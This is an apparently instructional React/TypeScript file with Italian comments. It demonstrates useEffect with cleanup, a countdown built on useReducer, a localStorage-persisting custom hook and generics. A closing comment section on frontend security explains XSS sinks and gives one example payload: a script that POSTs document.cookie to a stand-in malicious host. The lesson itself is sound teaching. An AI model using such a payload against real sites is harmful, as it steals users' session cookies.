import React from "react";

function EsempioUseEffect() {
  const [count, setCount] = React.useState(0);
  // useEffect esegue la funzione che racchiude il codice impuro
  // almeno una volta, quando entra in pagina
  // le successive volte se qualcosa all'interno dell'array delle dipendenze cambia
  // nell'array delle dipendeze vanno SEMPRE incluse le variabili
  // che sono utilizzate nella funzione che contineen il codice impuro
  // altrimenti otteniamo BUG super difficili da trovare
  React.useEffect(() => {
    console.log("effect", count);
    const intervalId = setInterval(() => console.log(count), 1000);
    // e come dire in un gioco di carte
    // questa carta verrà automaticamente giocata
    // all'inizio del prossimo turno
    // prima che i giocatori possano fare qualcosa
    // il codice di cleanup è opzionale
    return () => {
      console.log("clear effect", count);
      clearInterval(intervalId);
    };
  }, [count]);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}

// commmento
// la funzione che viene passata a useEffect
// è suddivisa in due parti
// la prima è FARE
// la seconda è DISFARE quanto fatto
// la seconda si codifica ritornando una funzione, ed è opzionale

function TitleModifier() {
  // const titolo = "titolo";
  const [titolo, setTitolo] = React.useState("titolo");

  // modificare il titolo della tab in base a quello che c'è nell'input
  // il titolo dell tab si modifica con document.title = "qualcosa"
  React.useEffect(() => {
    document.title = titolo;
  }, [titolo]);

  return (
    <input
      type="text"
      name="label"
      value={titolo}
      onChange={(event) => {
        // alert("devo cambiare titolo")
        setTitolo(event.currentTarget.value);
      }}
    />
  );
}

// il componente deve visualizzare un bottone
// con il testo "clicccami se no esplodi entro x secondi"
// la x nel testo deve essere real time
// se si clicca, la x ridiventa 10
// se il timer scade, visualizzare al posto del bottone "sei esploso"
export function CountDown() {
  const [secondiRimanenti, dispatchX] = React.useReducer(
    (state: number, action: { type: "dec" } | { type: "reset" }) => {
      switch (action.type) {
        case "dec":
          return state - 1;
        case "reset":
          return 10;
      }
    },
    10
  );

  React.useEffect(() => {
    const intervalId = setInterval(() => {
      // qui mutrlizziamo la seconda fimra del setter
      // passando una funzione che produrra il nuovo valore
      // e siccome riceve come paramtero il valore attuale
      // lo possiamo utilizzare, senza doverlo mettere nelle dependencies
      dispatchX({ type: "dec" });
    }, 1000);
    // prima del return è FARE
    // dopo il return è DISFARE
    return () => {
      clearInterval(intervalId);
    };
  }, []);

  const seiesploso = secondiRimanenti < 0;
  if (seiesploso) {
    return <h1>sei esploso</h1>;
  }
  return (
    <button
      onClick={() => {
        // funzione setta la x a 10
        dispatchX({ type: "reset" });
      }}
    >
      clicccami se no esplodi entro {secondiRimanenti} secondi
    </button>
  );
}

// realizzare una custom hook
// che ci permette di persistere lo stato nel local storage
// poi lo utilizzeremo con due semplici input
// per vedere che ricaricando la pagina il valore permane

export function EsempioUtilizzoLocalStorage() {
  // aggiungere codice qui
  const [a, setA] = useStorage("a", "");
  const [b, setB] = useStorage("b", "");
  return (
    <>
      A:{" "}
      <input
        type="text"
        value={a}
        onChange={(event) => setA(event.currentTarget.value)}
      />
      <br />
      B:{" "}
      <input
        type="text"
        value={b}
        onChange={(event) => setB(event.currentTarget.value)}
      />
      <br />
    </>
  );
}

export function useStorage<Item>(localStorageKey: string, initialState: Item) {
  // devo partire da uno stato
  // devo mantenere uno stato
  const [state, setState] = React.useState<Item>(() => {
    // devo leggere uno stato dal local storage
    const persisted = localStorage.getItem(localStorageKey);
    if (!persisted) return initialState;
    return JSON.parse(persisted);
  });

  React.useEffect(() => {
    // devo salvare uno stato in local storage
    localStorage.setItem(localStorageKey, JSON.stringify(state));
  }, [localStorageKey, state]);

  // devo permettere all'utlizzatore di leggere lo stato
  // devo permettere all'utilizzatore di cambiare lo stato
  return [state, setState] as const;
}

function useQualcosaConStatoDerivato() {
  const [a, setA] = React.useState(0);
  const [b, setB] = React.useState(0);
  const c = a + b;
}

// questo e assolutamente da evitare
function useQualcosaConSincronizzazioneDiStato() {
  const [a, setA] = React.useState(0);
  const [b, setB] = React.useState(0);
  const [c, setC] = React.useState(0);
  React.useEffect(() => {
    setC(a + b);
  }, [a, b]);
}

// esempio di inference

function inferenceExample<Value>(x: Value) {
  return x;
}

const prova1 = inferenceExample(Math.random());

// esempio generics espicite
const prova2 = inferenceExample<string>(45);

// SICUREZZA
// gli unici buchi di sicurezza lato frontend sono questi

// inclusione di javascript o css di terze parti, ad esempio da un cdn, o github, se la libreria utilizzata viene hackerata, il nostro sito diventa vulnerabile

// utilizzo di input dell'utente o dati del backend
// come html css o javascript

// esempi:

// recuperata dal backend
// inserita dall'utente
let stringaPericolosa;

// element.innerHTML = stringaPericolosa;

// element.setAttribute("style", stringaPericolosa);

// eval(stringaPericola);

// eval() is evil

// perchè è pericoloso?
// io malintenzionato su un forum, scrivo un post fatto cosi
// <script>fetch("server-malintezionato.io", { method: "POST", body: document.coookie })</script>

// <div style={{ color: stringaPericolosa }}> // ok perchè react sanifica
